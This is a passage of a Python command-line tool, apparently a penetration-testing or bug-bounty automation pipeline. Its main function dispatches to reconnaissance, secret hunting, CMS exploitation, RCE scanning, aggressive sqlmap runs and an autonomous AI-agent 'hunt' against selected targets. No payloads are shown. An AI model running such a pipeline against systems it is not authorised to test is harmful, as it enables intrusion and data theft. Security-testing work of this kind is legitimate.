                        help="Raw HTTP request file (Burp export) — runs sqlmap -r directly")
    parser.add_argument("--post-params",      action="store_true",
                        help="Run POST parameter discovery (katana forms + arjun POST) on target")
    parser.add_argument("--cookie",           type=str, default="",
                        help="Session cookie string for authenticated POST discovery "
                             "(e.g. 'JSESSIONID=abc123; session=xyz')")
    parser.add_argument("--sqlmap-level",     type=int, default=5,
                        help="sqlmap --level for --request-file mode (default 5)")
    parser.add_argument("--sqlmap-risk",      type=int, default=3,
                        help="sqlmap --risk for --request-file mode (default 3)")
    parser.add_argument("--sqlmap-extra",     type=str, default="",
                        help="Extra sqlmap flags (e.g. '--dbms=mysql --technique=BT')")

    args = parser.parse_args()
    resume_requested = args.resume is not None
    resume_session_id = None if args.resume in (None, "", "latest") else args.resume
    skip_items = parse_skip_items(args.skip)

    if resume_session_id and not args.target:
        log("err", "--resume SESSION_ID requires --target")
        sys.exit(1)

    brain_requested = not any((
        args.status,
        args.setup_wordlists,
        args.select_targets,
        args.report_only,
        args.oob_setup,
    ))
    if brain_requested and not args.no_brain:
        init_brain(log_errors=True)

    if args.no_brain and _brain:
        _brain.enabled = False
        log("info", "Brain disabled via --no-brain")

    brain_status = (
        f"{MAGENTA}Brain: ON ({_brain.model if _brain else 'unknown'}){NC}"
        if (_brain and _brain.enabled)
        else f"{YELLOW}Brain: OFF{NC}"
    )

    print(f"""
{BOLD}╔══════════════════════════════════════════════════════════╗
║   VAPT Automation Pipeline v4                          ║
║   Recon · JS · Secrets · Params · API · CORS           ║
║   CMS Exploit · SQLmap · JWT · Brain                   ║
╚══════════════════════════════════════════════════════════╝{NC}
  {brain_status}
""")

    if args.status and not args.repair_tools:
        show_status()
        return

    if args.oob_setup:
        run_oob_setup()
        return

    if args.triage:
        if not _brain or not _brain.enabled:
            log("err", "Brain not available")
            sys.exit(1)
        verdict, _ = _brain.triage_finding(args.triage)
        print(f"\n{BOLD}Verdict: {verdict}{NC}")
        return

    if args.brain_next:
        if not _brain or not _brain.enabled:
            log("err", "Brain not available")
            sys.exit(1)
        if not args.target:
            log("err", "--target required")
            sys.exit(1)
        if resume_requested:
            _, recon_dir = _activate_recon_session(
                args.target,
                requested_session_id=resume_session_id or "latest",
                create=False,
            )
            if not recon_dir:
                log("err", f"No recon session found for {args.target} to resume")
                sys.exit(1)
        else:
            _, recon_dir = _activate_recon_session(args.target, create=False)
        findings_dir = _resolve_findings_dir(args.target, session_id=resume_session_id or "latest")
        summary_parts = []
        for d, label in [(recon_dir, "recon"), (findings_dir, "findings")]:
            if os.path.isdir(d):
                files = [f for f in os.listdir(d) if not f.startswith('.')]
                summary_parts.append(f"{label}: {len(files)} items in {d}")
        summary = "\n".join(summary_parts) or f"No data yet for {args.target}"
        _brain.next_action("active hunt", summary, args.time)
        return

    if args.brain_only:
        if not _brain or not _brain.enabled:
            log("err", "Brain not available")
            sys.exit(1)
        if not args.target:
            log("err", "--target required")
            sys.exit(1)
        if resume_requested:
            _, recon_dir = _activate_recon_session(
                args.target,
                requested_session_id=resume_session_id or "latest",
                create=False,
            )
            if not recon_dir:
                log("err", f"No recon session found for {args.target} to resume")
                sys.exit(1)
        else:
            _, recon_dir = _activate_recon_session(args.target, create=False)
        findings_dir = _resolve_findings_dir(args.target, session_id=resume_session_id or "latest")
        _brain.run_full_pipeline(recon_dir, findings_dir)
        return

    if args.semgrep:
        target = args.target or "unknown"
        run_semgrep(args.semgrep, domain=target)
        return

    # ── --request-file: direct Burp request → sqlmap -r ─────────────────────
    if args.request_file:
        found = run_sqlmap_request_file(
            args.request_file,
            domain=args.target or None,
            level=args.sqlmap_level,
            risk=args.sqlmap_risk,
            extra_flags=args.sqlmap_extra,
        )
        sys.exit(0 if found else 1)

    # ── --post-params: discover POST endpoints + params + sqlmap ─────────────
    if args.post_params:
        if not args.target:
            log("err", "--post-params requires --target")
            sys.exit(1)
        run_post_param_discovery(
            args.target,
            cookies=args.cookie,
        )
        return

    if args.setup_wordlists:
        setup_wordlists()
        return

    installed, missing = check_tools()
    log("info", f"Tools: {len(installed)}/{len(TOOL_REGISTRY)} installed")
    if missing:
        log("warn", f"Missing: {', '.join(missing)}")

    should_auto_repair = bool(missing) and (
        args.repair_tools or (args.autonomous and not args.no_auto_install_tools)
    )
    if should_auto_repair:
        mode = "full" if args.allow_system_installs else "safe"
        log("info", f"Autonomous dependency repair: attempting {mode} recovery for {len(missing)} missing tools")
        repair = auto_repair_tools(missing, include_system=args.allow_system_installs)
        if repair["installed"]:
            log("ok", f"Installed: {', '.join(repair['installed'])}")
        if repair["failed"]:
            log("warn", f"Failed: {', '.join(repair['failed'])}")
        if repair["skipped"]:
            skipped_mode = ("manual install required" if args.allow_system_installs
                            else "needs --allow-system-installs or manual install")
            log("warn", f"Skipped: {', '.join(repair['skipped'])} ({skipped_mode})")

        installed, missing = check_tools()
        log("info", f"Tools after repair: {len(installed)}/{len(TOOL_REGISTRY)} installed")
        if missing:
            log("warn", f"Still missing: {', '.join(missing)}")

    if args.status:
        show_status()
        return

    if args.repair_tools and not any((
        args.target,
        args.select_targets,
        args.report_only,
        args.semgrep,
        args.triage,
        args.brain_next,
        args.brain_only,
        args.oob_setup,
    )):
        return

    if args.select_targets:
        select_targets(top_n=args.top)
        return

    if args.report_only:
        if args.target:
            generate_reports(args.target)
        elif os.path.isdir(FINDINGS_DIR):
            for d in os.listdir(FINDINGS_DIR):
                if os.path.isdir(_findings_domain_root(d)):
                    generate_reports(d)
        return

    if not os.path.exists(os.path.join(WORDLIST_DIR, "common.txt")):
        setup_wordlists()

    if args.target:
        resume_label = resume_session_id or ("latest" if resume_requested else "new")
        log("info", f"Target: {args.target} | batch={args.batch_size} | full={args.full} | autonomous={args.autonomous} | agent={getattr(args, 'agent', False)} | session={resume_label}")
        if getattr(args, "agent", False):
            try:
                from agent import run_agent_hunt
            except ImportError as _ae:
                log("err", f"agent.py not found or missing dependency: {_ae}")
                log("err", "Ensure agent.py is in the same directory. pip install ollama")
                sys.exit(1)
            result = run_agent_hunt(
                args.target,
                scope_lock=args.scope_lock,
                max_urls=args.max_urls,
                max_steps=args.max_steps,
                time_budget_hours=args.time,
                cookies=getattr(args, "cookie", ""),
                model=None,
                resume_session_id=resume_session_id,
                use_langgraph=getattr(args, "langgraph", False),
            )
            print_dashboard([result])
            return
        elif args.autonomous:
            result = run_autonomous_hunt(
                args.target,
                quick=args.quick,
                full=args.full,
                resume=resume_requested,
                resume_session_id=resume_session_id,
                batch_size=args.batch_size,
                max_steps=args.max_steps,
                allow_destructive=args.allow_destructive,
                skip_items=skip_items,
                time_left_hours=args.time,
                scope_lock=args.scope_lock,
                max_urls=args.max_urls,
            )
        else:
            result = hunt_target(
                args.target,
                quick=args.quick,
                resume=resume_requested,
                resume_session_id=resume_session_id,
                recon_only=args.recon_only,
                scan_only=args.scan_only,
                cve_hunt=args.cve_hunt,
                zero_day=args.zero_day,
                prioritize_only=args.prioritize_only,
                batch_size=args.batch_size,
                js_scan=args.js_scan,
                param_discover=args.param_discover,
                api_fuzz=args.api_fuzz,
                secret_hunt=args.secret_hunt,
                cors_check=args.cors_check,
                cms_exploit=args.exploit or args.cms_exploit,
                rce_scan=args.rce_scan,
                sqlmap_scan=args.sqlmap,
                jwt_audit=args.jwt_audit,
                post_param_discover=args.post_params,
                cookie=args.cookie,
                skip_items=skip_items,
                full=args.full,
                scope_lock=args.scope_lock,
                max_urls=args.max_urls,
                browser_scan=args.browser_scan,
                browser_headed=args.browser_headed,
                browser_model=args.browser_model,
                browser_unsafe=args.browser_unsafe,
            )
        print_dashboard([result])
        return

    # Full pipeline
    if args.autonomous:
        log("err", "--autonomous currently requires --target")
        sys.exit(1)

    log("info", "Starting full pipeline...")
    targets = select_targets(top_n=args.top)
    if not targets:
        log("err", "No targets. Exiting.")
        sys.exit(1)

    results = []
    for i, target in enumerate(targets):
        domains = target.get("scope_domains", [])
        if not domains:
            continue
        primary = domains[0]
        log("info", f"[{i+1}/{len(targets)}] {target.get('name', primary)} → {primary}")
        result = hunt_target(
            primary,
            quick=args.quick,
            resume=resume_requested,
            resume_session_id=resume_session_id,
            batch_size=args.batch_size,
            full=args.full,
            browser_scan=args.browser_scan if hasattr(args, "browser_scan") else False,
            browser_headed=args.browser_headed if hasattr(args, "browser_headed") else False,
            browser_model=args.browser_model if hasattr(args, "browser_model") else None,
            browser_unsafe=args.browser_unsafe if hasattr(args, "browser_unsafe") else False,
        )
        results.append(result)

    print_dashboard(results)


if __name__ == "__main__":
    main()
